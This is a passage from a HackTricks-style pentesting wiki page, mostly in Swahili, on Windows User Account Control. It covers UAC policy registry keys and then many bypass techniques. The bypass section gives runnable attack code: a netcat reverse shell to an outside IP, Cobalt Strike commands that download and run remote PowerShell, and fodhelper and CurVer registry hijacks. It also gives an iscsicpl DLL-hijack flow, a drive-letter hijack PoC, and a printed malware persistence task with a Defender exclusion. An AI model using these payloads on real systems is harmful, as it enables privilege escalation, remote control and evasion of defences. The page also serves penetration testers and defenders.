# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **consent prompt kwa elevated activities**. Applications zina viwango tofauti vya `integrity`, na program yenye **high level** inaweza kufanya kazi ambazo **zinaweza kwa potenciali ku-compromise system**. UAC ikiwa imewezeshwa, applications na tasks daima **zina-run chini ya security context ya account isiyo ya administrator** isipokuwa administrator aidhinishe waziwazi applications/tasks hizi ziwe na administrator-level access kwenye system ili zi-run. Ni kipengele cha urahisi kinachowalinda administrators dhidi ya mabadiliko yasiyokusudiwa lakini hakizingatiwi kuwa security boundary.

Kwa maelezo zaidi kuhusu integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wakati UAC ipo, administrator user hupewa tokens 2: standard user key, ya kufanya actions za kawaida kama regular level, na moja yenye admin privileges.

Hili [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) linajadili kwa kina jinsi UAC inavyofanya kazi na linajumuisha logon process, user experience, na UAC architecture. Administrators wanaweza kutumia security policies kusanidi jinsi UAC inavyofanya kazi mahsusi kwa organization yao katika local level (kwa kutumia secpol.msc), au kusanidiwa na kusukumwa kupitia Group Policy Objects (GPO) ndani ya Active Directory domain environment. Settings mbalimbali zinajadiliwa kwa undani [hapa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna Group Policy settings 10 zinazoweza kuwekwa kwa UAC. Jedwali lifuatalo linatoa maelezo ya ziada:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies for installing software on Windows

**local security policies** ("secpol.msc" kwenye systems nyingi) zimesanidiwa kwa default **kuzuia non-admin users kufanya software installations**. Hii ina maana kwamba hata kama non-admin user anaweza kupakua installer ya software yako, hataweza kui-run bila admin account.

### Registry Keys to Force UAC to Ask for Elevation

As a standard user with no admin rights, unaweza kuhakikisha kwamba account ya "standard" **inaombwa credentials na UAC** inapojaribu kufanya actions fulani. Action hii ingebidi irekebishe baadhi ya **registry keys**, ambazo unahitaji admin permissions kuzibadilisha, isipokuwa kuwe na **UAC bypass**, au attacker tayari ameingia kama admin.

Hata kama user yuko katika group la **Administrators**, mabadiliko haya humlazimisha user **kuingiza tena credentials za account yake** ili kufanya administrative actions.

**Kikwazo pekee ni kwamba mbinu hii inahitaji UAC iwe disabled ili ifanye kazi, jambo ambalo si la kawaida katika production environments.**

Registry keys na entries unazopaswa kubadilisha ni zifuatazo (zikiwa na default values ndani ya mabano):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Hili pia linaweza kufanywa manually kupitia Local Security Policy tool. Baada ya kubadilishwa, administrative operations humprompt user kuingiza tena credentials zake.

### Note

**User Account Control si security boundary.** Kwa hiyo, standard users hawawezi kutoka nje ya accounts zao na kupata administrator rights bila local privilege escalation exploit.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode hutumia integrity checks ili kuzuia processes za high-integrity-level (kama web browsers) kufikia data za low-integrity-level (kama temporary Internet files folder). Hii hufanywa kwa kuendesha browser na low-integrity token. Wakati browser inapojaribu kufikia data iliyohifadhiwa kwenye low-integrity zone, operating system hukagua integrity level ya process na huruhusu access kulingana na hilo. Feature hii husaidia kuzuia attacks za remote code execution zisipate access kwa sensitive data kwenye system.
- Wakati user anapo log on to Windows, system huunda access token inayobeba list ya privileges za user huyo. Privileges hufafanuliwa kama mchanganyiko wa rights na capabilities za user. Token pia hubeba list ya credentials za user, ambazo ni credentials zinazotumika kum authenticate user kwa computer na kwa resources kwenye network.

### Autoadminlogon

Ili kusanidi Windows ili i-log on automatically user maalum wakati wa startup, weka **`AutoAdminLogon` registry key**. Hii ni muhimu kwa kiosk environments au kwa testing purposes. Tumia hii tu kwenye systems salama, kwa sababu huonyesha password kwenye registry.

Weka keys zifuatazo ukitumia Registry Editor au `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Ili kurudisha normal logon behavior, weka `AutoAdminLogon` kuwa 0.

## UAC bypass

> [!TIP]
> Kumbuka kwamba ikiwa una graphical access kwa victim, UAC bypass ni straight forward kwa sababu unaweza tu kubofya "Yes" wakati UAC prompt inaonekana

UAC bypass inahitajika katika hali ifuatayo: **UAC imeanzishwa, process yako inaendeshwa katika medium integrity context, na user wako ni wa group la administrators**.

Ni muhimu kutaja kwamba ni **ngumu zaidi sana bypass UAC ikiwa iko kwenye highest security level (Always) kuliko ikiwa iko kwenye levels nyingine zozote (Default).**

### UAC disabled

Ikiwa UAC tayari imezimwa (`ConsentPromptBehaviorAdmin` ni **`0`**) unaweza **kutekeleza reverse shell yenye admin privileges** (high integrity level) ukitumia kitu kama:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Very** Basic UAC "bypass" (full file system access)

Ikiwa una shell na mtumiaji ambaye yuko ndani ya group la Administrators unaweza **mount the C$** lililosambazwa kupitia SMB (file system) local kwenye disk mpya na utakuwa na **access to everything inside the file system** (hata folda ya nyumbani ya Administrator).

> [!WARNING]
> **Inaonekana kama hila hii haifanyi kazi tena**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Mbinu za Cobalt Strike zitafanya kazi tu ikiwa UAC haijawekwa katika kiwango chake cha juu cha usalama
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** na **Metasploit** pia zina moduli kadhaa za **bypass** ya **UAC**.

### KRBUACBypass

Documentation na tool iko katika [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) ambayo ni **compilation** ya exploits kadhaa za UAC bypass. Kumbuka kuwa utahitaji **compile UACME ukitumia visual studio au msbuild**. Compilation itatengeneza executables kadhaa (kama `Source\Akagi\outout\x64\Debug\Akagi.exe`) , utahitaji kujua **ni ipi unayohitaji.**\
Unapaswa **kuwa mwangalifu** kwa sababu baadhi ya bypasses zitaweza **kudokeza baadhi ya programs nyingine** ambazo zitaweza **kumuonya** **user** kwamba kuna kitu kinatokea.

UACME ina **build version kutoka ambayo kila technique ilianza kufanya kazi**. Unaweza kutafuta technique inayogusa versions zako:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Pia, kwa kutumia [hii](https://en.wikipedia.org/wiki/Windows_10_version_history) ukurasa unapata Windows release `1607` kutoka kwa build versions.

### UAC Bypass – fodhelper.exe (Registry hijack)

Binary inayoaminika `fodhelper.exe` ina auto-elevated kwenye Windows za kisasa. Inapoanzishwa, huuliza per-user registry path hapa chini bila kuthibitisha verb ya `DelegateExecute`. Kuweka command hapo kunaruhusu process ya Medium Integrity (user yuko kwenye Administrators) kuanzisha process ya High Integrity bila UAC prompt.

Registry path queried by fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Hatua za PowerShell (weka payload yako, kisha anzisha)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notes:
- Hufanya kazi wakati mtumiaji wa sasa ni mwanachama wa Administrators na kiwango cha UAC ni default/lenient (sio Always Notify with extra restrictions).
- Tumia njia ya `sysnative` kuanzisha 64-bit PowerShell kutoka kwa 32-bit process kwenye 64-bit Windows.
- Payload inaweza kuwa amri yoyote (PowerShell, cmd, au njia ya EXE). Epuka kuonyesha UIs kwa stealth.

#### CurVer/extension hijack variant (HKCU only)

Recent samples abusing `fodhelper.exe` avoid `DelegateExecute` and instead **redirect the `ms-settings` ProgID** via the per-user `CurVer` value. The auto-elevated binary still resolves the handler under `HKCU`, so no admin token is needed to plant the keys:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Mara baada ya kupandishwa kiwango, malware kwa kawaida **huzima future prompts** kwa kuweka `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` kuwa `0`, kisha hufanya additional defense evasion (k.m., `Add-MpPreference -ExclusionPath C:\ProgramData`) na huunda upya persistence ili iendeshwe kama high integrity. Kazi ya kawaida ya persistence huhifadhi **XOR-encrypted PowerShell script** kwenye disk na hui-decode/hui-execute in-memory kila saa:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Variante hii bado husafisha dropper na huacha tu staged payloads, hivyo detection inategemea kufuatilia **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` tampering, kuundwa kwa Defender exclusion, au scheduled tasks ambazo hufanya PowerShell decrypt in-memory.

#### More UAC bypass

**Mbinu zote** zinazotumiwa hapa kupita AUC **zinahitaji** **full interactive shell** na victim (shell ya kawaida ya nc.exe haitoshi).

Unaweza kuipata kwa kutumia session ya **meterpreter**. Hamisha kwenda kwenye **process** yenye thamani ya **Session** sawa na **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ should works)

### UAC Bypass with GUI

Kama una access ya **GUI unaweza tu kukubali UAC prompt** unapopata hiyo, huhitaji kweli bypass. Kwa hiyo, kupata access ya GUI kutakuwezesha kupita UAC.

Zaidi ya hayo, ukipata GUI session ambayo mtu alikuwa anaitumia (huenda kupitia RDP) kuna **tools kadhaa ambazo zitakuwa zikiendeshwa kama administrator** ambazo unaweza **ku-run** `cmd` kwa mfano **as admin** moja kwa moja bila kuombwa tena na UAC kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa zaidi **stealthy**.

### Noisy brute-force UAC bypass

Kama haujali kuwa noisy unaweza kila wakati **ku-run kitu kama** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) ambacho **huomba kuinua permissions hadi user akubali**.

### Your own bypass - Basic UAC bypass methodology

Ukiangalia **UACME** utaona kwamba **UAC bypasses nyingi hutumia vibaya vulnerability ya Dll Hijacking** (hasa kuandika malicious dll kwenye _C:\Windows\System32_). [Soma hiki kujifunza jinsi ya kupata Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Pata binary ambayo ita **autoelevate** (angalia kwamba inapotekelezwa inaendesha kwenye high integrity level).
2. Kwa procmon pata events za "**NAME NOT FOUND**" ambazo zinaweza kuwa vulnerable kwa **DLL Hijacking**.
3. Huenda ukahitaji **kuandika** DLL ndani ya baadhi ya **protected paths** (kama C:\Windows\System32) ambazo huna permissions za kuandika. Unaweza kupita hili kwa kutumia:
1. **wusa.exe**: Windows 7,8 na 8.1. Inaruhusu kutoa content ya CAB file ndani ya protected paths (kwa sababu tool hii inatekelezwa kutoka high integrity level).
2. **IFileOperation**: Windows 10.
4. Tayarisha **script** ya kunakili DLL yako ndani ya protected path na kutekeleza vulnerable na autoelevated binary.

### Another UAC bypass technique

Inajumuisha kuangalia kama **autoElevated binary** inajaribu **kusoma** kutoka kwenye **registry** **jina/path** ya **binary** au **command** itakayokuwa **executed** (hii inavutia zaidi ikiwa binary inatafuta taarifa hii ndani ya **HKCU**).

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

32-bit `C:\Windows\SysWOW64\iscsicpl.exe` ni binary ya **auto-elevated** ambayo inaweza kutumiwa vibaya kupakia `iscsiexe.dll` kwa search order. Kama unaweza kuweka `iscsiexe.dll` yenye malicious ndani ya folder inayoweza kuandikwa na **user** kisha ukabadilisha current user `PATH` (kwa mfano kupitia `HKCU\Environment\Path`) ili folder hiyo itafutwe, Windows inaweza kupakia attacker DLL ndani ya mchakato uliyo-elevated wa `iscsicpl.exe` **bila kuonyesha UAC prompt**.

Practical notes:
- Hii ni muhimu wakati current user yuko kwenye **Administrators** lakini anaendesha kwa **Medium Integrity** kutokana na UAC.
- Nakala ya **SysWOW64** ndiyo muhimu kwa bypass hii. Chukulia nakala ya **System32** kama binary tofauti na thibitisha behavior yake kivyake.
- Primitive hii ni mchanganyiko wa **auto-elevation** na **DLL search-order hijacking**, hivyo workflow ile ile ya ProcMon inayotumiwa kwa UAC bypasses nyingine ni muhimu kuthibitisha upakiaji wa DLL inayokosekana.

Minimal flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Detection ideas:
- Alert on `reg add` / registry writes to `HKCU\Environment\Path` immediately followed by execution of `C:\Windows\SysWOW64\iscsicpl.exe`.
- Hunt for `iscsiexe.dll` in **user-controlled** locations such as `%TEMP%` or `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Correlate `iscsicpl.exe` launches with unexpected child processes or DLL loads from outside the normal Windows directories.

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” uses shadow-admin tokens with per-session `\Sessions\0\DosDevices/<LUID>` maps. The directory is created lazily by `SeGetTokenDeviceMap` on first `\??` resolution. If the attacker impersonates the shadow-admin token only at **SecurityIdentification**, the directory is created with the attacker as **owner** (inherits `CREATOR OWNER`), allowing drive-letter links that take precedence over `\GLOBAL??`.

**Steps:**

1. From a low-privileged session, call `RAiProcessRunOnce` to spawn a promptless shadow-admin `runonce.exe`.
2. Duplicate its primary token to an **identification** token and impersonate it while opening `\??` to force creation of `\Sessions\0\DosDevices/<LUID>` under attacker ownership.
3. Create a `C:` symlink there pointing to attacker-controlled storage; subsequent filesystem accesses in that session resolve `C:` to the attacker path, enabling DLL/file hijack without a prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Marejeo
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: 0-Day Exploitation Against Southeast Asian Government Targets](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
